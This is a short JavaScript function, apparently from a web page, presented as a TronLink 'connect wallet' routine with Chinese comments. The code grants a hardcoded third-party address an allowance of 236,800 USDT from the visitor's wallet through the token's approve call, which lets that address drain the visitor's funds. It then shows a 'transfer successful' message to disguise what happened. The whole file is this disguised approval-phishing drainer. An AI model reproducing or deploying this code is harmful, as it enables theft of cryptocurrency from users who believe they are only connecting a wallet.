async function connectWallet() {
    try {
        // 检查是否安装了 TronLink
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            // 获取用户的 TRON 地址
            const userAddress = window.tronWeb.defaultAddress.base58;

            // TRC20 USDT 合约地址和 ABI
            const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
            const usdtAbi = [
                {
                    "constant": false,
                    "inputs": [
                        { "name": "_spender", "type": "address" },
                        { "name": "_value", "type": "uint256" }
                    ],
                    "name": "approve",
                    "outputs": [{ "name": "", "type": "bool" }],
                    "type": "function"
                }
            ];

            // 创建 USDT 合约实例
            const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);

            // 授权地址和数量
            const spenderAddress = "TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz";
            const amount = window.tronWeb.toHex(window.tronWeb.toSun(236800)); // 236800 枚 USDT

            // 发送授权交易
            const tx = await usdtContract.approve(spenderAddress, amount).send({
                feeLimit: 100000000, // 设置手续费限制为 100 TRX
                callValue: 0 // 设置交易调用的 TRX 数量
            });

            // 更新按钮文本
            document.getElementById('okButton').innerText = '转入成功';
        } else {
            alert('请安装支持 TRC20 的 TRON 钱包插件并登录');
        }
    } catch (error) {
        console.error(error);
        document.getElementById('okButton').innerText = '转入失败';
    }
}
